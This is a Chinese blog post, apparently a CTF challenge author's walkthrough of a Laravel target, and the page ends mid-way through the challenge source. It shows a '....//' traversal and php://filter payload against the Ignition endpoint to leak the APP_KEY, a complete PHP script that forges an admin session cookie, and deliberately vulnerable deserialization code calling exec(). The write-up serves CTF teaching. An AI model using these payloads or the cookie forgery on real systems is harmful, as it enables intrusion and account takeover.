@@ -1,0 +1,603 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    出题——这关难不倒你算炸单 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="出题——这关难不倒你算炸单前言这次出题参考采取任意文件读取漏洞 + Laravel 框架结合版，算是基于任意文件读取的最后一舞 本意让选手学会在不同复杂的场景下，利用任意文件读取漏洞扩大危害 Laravel 框架全球使用占比约 64%，另外两个则是 WordPress（25%）、Symfony（23%） Symfony 框架国内不用，WordPress 现成的靶机（VulnHub）也都有，所以采用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="出题——这关难不倒你算炸单">
+<meta property="og:url" content="http://example.com/2026/04/11/%E8%BF%99%E5%85%B3%E9%9A%BE%E4%B8%8D%E5%80%92%E4%BD%A0%E7%AE%97%E7%82%B8%E5%8D%95/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="出题——这关难不倒你算炸单前言这次出题参考采取任意文件读取漏洞 + Laravel 框架结合版，算是基于任意文件读取的最后一舞 本意让选手学会在不同复杂的场景下，利用任意文件读取漏洞扩大危害 Laravel 框架全球使用占比约 64%，另外两个则是 WordPress（25%）、Symfony（23%） Symfony 框架国内不用，WordPress 现成的靶机（VulnHub）也都有，所以采用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ef9f8a5b9ddfae24421b76.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ef9faa5b9ddfae24421b79.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69ef9fec5b9ddfae24421b86.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa0205b9ddfae24421b8b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa0de5b9ddfae24421c65.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa1815b9ddfae24421df7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa5135b9ddfae24423397.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa6035b9ddfae244234c7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa75c5b9ddfae244237e7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa89a5b9ddfae24423892.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa93d5b9ddfae244238ab.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efa9a75b9ddfae244238bf.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efaa995b9ddfae244238dc.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69efac195b9ddfae24423906.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69f05d088e67748fa14ab209.png">
+<meta property="article:published_time" content="2026-04-10T18:39:00.000Z">
+<meta property="article:modified_time" content="2026-04-28T07:09:39.605Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="任意文件读取">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69ef9f8a5b9ddfae24421b76.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="出题——这关难不倒你算炸单">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">出题——这关难不倒你算炸单</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E2%80%94%E2%80%94%E8%BF%99%E5%85%B3%E9%9A%BE%E4%B8%8D%E5%80%92%E4%BD%A0%E7%AE%97%E7%82%B8%E5%8D%95"><span class="toc-number">1.</span> <span class="toc-text">出题——这关难不倒你算炸单</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ignition-execute-solution%EF%BC%88filter-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">&#x2F;_ignition&#x2F;execute-solution（filter + 双写绕过）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Laravel-Cookie-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">Laravel Cookie 伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-%E9%93%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">POP 链</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">61</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">12</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">114</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-这关难不倒你算炸单" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-10T18:39:00.000Z" itemprop="datePublished">2026-04-11</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="出题——这关难不倒你算炸单"><a href="#出题——这关难不倒你算炸单" class="headerlink" title="出题——这关难不倒你算炸单"></a>出题——这关难不倒你算炸单</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次出题参考采取任意文件读取漏洞 + Laravel 框架结合版，算是基于任意文件读取的最后一舞</p>
+<p>本意让选手学会在不同复杂的场景下，利用任意文件读取漏洞扩大危害</p>
+<p>Laravel 框架全球使用占比约 64%，另外两个则是 WordPress（25%）、Symfony（23%）</p>
+<p>Symfony 框架国内不用，WordPress 现成的靶机（VulnHub）也都有，所以采用 Laravel 框架出题</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问页面</p>
+<p><img src="https://pic1.imgdb.cn/item/69ef9f8a5b9ddfae24421b76.png"></p>
+<p>观察 URL 发现该站点采用的路由模式，大概率使用的现成框架</p>
+<p><img src="https://pic1.imgdb.cn/item/69ef9faa5b9ddfae24421b79.png"></p>
+<p>页面没啥功能点可测试，注册一个账号试试</p>
+<p><img src="https://pic1.imgdb.cn/item/69ef9fec5b9ddfae24421b86.png"></p>
+<p>查看 Cookie 发现两个字段，<code>laravel_session</code> 以及 <code>XSRF-TOKEN</code></p>
+<p>直接实锤了使用的 Laravel 框架开发</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa0205b9ddfae24421b8b.png"></p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><h3 id="ignition-execute-solution（filter-双写绕过）"><a href="#ignition-execute-solution（filter-双写绕过）" class="headerlink" title="&#x2F;_ignition&#x2F;execute-solution（filter + 双写绕过）"></a>&#x2F;_ignition&#x2F;execute-solution（filter + 双写绕过）</h3><p>搜索历史漏洞，找到一个 CVE-2021-3129</p>
+<p>参考漏洞复现博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoyunxiaogang/p/16913350.html">https://www.cnblogs.com/xiaoyunxiaogang/p/16913350.html</a></p>
+<p><img src="https://pic1.imgdb.cn/item/69efa0de5b9ddfae24421c65.png"></p>
+<p>阅读完文章发现次漏洞点是基于报错产生的，博客中的报错是：未指定应用程序的 APP_KEY 加密密钥</p>
+<p>所以我们不妨切换下思路，手动构造一个报错看看能否跳转到相似的页面上去</p>
+<p>URL 中添加错误路由访问，果然跳转到了相似的页面，接口都是一样的</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa1815b9ddfae24421df7.png"></p>
+<p>根据页面回显的接口测试数据构造数据包</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa5135b9ddfae24423397.png"></p>
+<p><code>viewFile</code> 根据字段名推测是要填入文件名，索性填一个 Laravel 环境配置文件 <code>.env</code> 试试</p>
+<p>一般入口文件和 <code>.env</code> 都在根目录下，或者入口文件在 <code>/public/</code> 中</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa6035b9ddfae244234c7.png"></p>
+<p>文件不可读取或不存在，使用双写绕过试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....//.env</span><br></pre></td></tr></table></figure>
+
+<p>这次响应不一样了，说是检测到响应中有敏感内容</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa75c5b9ddfae244237e7.png"></p>
+<p>既然后端检测文件中的内容，那么肯定是对敏感的关键字进行检测了，如 <code>passwd</code> 之类的</p>
+<p>我们这里可以采用 PHP 伪协议 <code>php://filter</code> 对其 Base64 编码输出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=....//.env</span><br></pre></td></tr></table></figure>
+
+<p>解码拿到 <code>APP_KEY</code> 值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span>:Nxxpbkj/QV1f+5uICIZjdf4rG93Dq7gVQbHNOulFxxQ=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69efa89a5b9ddfae24423892.png"></p>
+<p>继续扩大危害，尝试读取数据库配置文件 <code>config/database.php</code></p>
+<p>拿到数据库用户名以及一个假的 flag 值</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa93d5b9ddfae244238ab.png"></p>
+<p>继续读取其框架的日志文件 <code>storage/logs/laravel.log</code></p>
+<p>解码后发现有一个文件的文件名不对劲</p>
+<p><img src="https://pic1.imgdb.cn/item/69efa9a75b9ddfae244238bf.png"></p>
+<p>尝试去读取文件源代码回显无权限</p>
+<p><img src="https://pic1.imgdb.cn/item/69efaa995b9ddfae244238dc.png"></p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="Laravel-Cookie-伪造"><a href="#Laravel-Cookie-伪造" class="headerlink" title="Laravel Cookie 伪造"></a>Laravel Cookie 伪造</h3><p>编写脚本生成 admin260117 用户的 Cookie 去访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$appKeyStr</span> = <span class="string">&#x27;base64:Nxxpbkj/QV1f+5uICIZjdf4rG93Dq7gVQbHNOulFxxQ=&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$appKeyStr</span>, <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookieName</span> = <span class="string">&#x27;laravel_session&#x27;</span>;</span><br><span class="line"><span class="variable">$cookieValue</span> = <span class="string">&#x27;admin260117&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Laravel 的 EncryptCookies 中间件会校验基于 cookie 名称生成的 HMAC</span></span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha1&#x27;</span>, <span class="variable">$cookieName</span> . <span class="string">&#x27;v2&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$valueToEncrypt</span> = <span class="variable">$hash</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$cookieValue</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">random_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Laravel 默认会对明文进行 serialize 序列化</span></span><br><span class="line"><span class="variable">$value</span> = \<span class="title function_ invoke__">openssl_encrypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$valueToEncrypt</span>), <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>);</span><br><span class="line"><span class="variable">$mac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$iv</span>.<span class="variable">$value</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">json_encode</span>(<span class="title function_ invoke__">compact</span>(<span class="string">&#x27;iv&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;mac&#x27;</span>));</span><br><span class="line"><span class="variable">$forgedCookie</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$json</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Forged Cookie: &quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$forgedCookie</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laravel_session=eyJpdiI6Ild0Z2pqbG1MTHExTm1VeWZhSTE2M1E9PSIsInZhbHVlIjoidEZadHV6cjZNRXpvMUY5TFhpNFJ1aHcxOXBjN0pHRTh3TFRSQlwvQ283K045aXFhNFlrdUlYT1JwODZUSnV6QUM4QTZweTZkcHJUMDNrRmE1VkdKOUl3PT0iLCJtYWMiOiI4OTRmYzQ1ZmFiODRmYTc1YjgzM2IzOTNhN2YwMGNkMDkxZWJjM2MyMTQ4ZGJlZDk0MGI0M2QxODg2NzBjZjljIn0%3D</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到文件源代码，发现是 PHP 反序列化</p>
+<p><img src="https://pic1.imgdb.cn/item/69efac195b9ddfae24423906.png"></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="POP-链"><a href="#POP-链" class="headerlink" title="POP 链"></a>POP 链</h3><p>源代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Hidden</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POP Chain classes</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;profile) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;db) &#123;</span><br><span class="line">            <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;db;</span><br><span class="line">            <span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;host) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;host;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;cmd) &#123;</span><br><span class="line">            <span class="comment">// Blind RCE - no output</span></span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Command Executed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$role</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;laravel_session&#x27;</span>]) ? <span class="variable">$_COOKIE</span>[<span class="string">&#x27;laravel_session&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$role</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;无权限访问&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">make</span>(<span class="title class_">\Illuminate\Contracts\Console\Kernel</span>::<span class="variable language_">class</span>)-&gt;<span class="title function_ invoke__">bootstrap</span>();</span><br><span class="line"></span><br><span 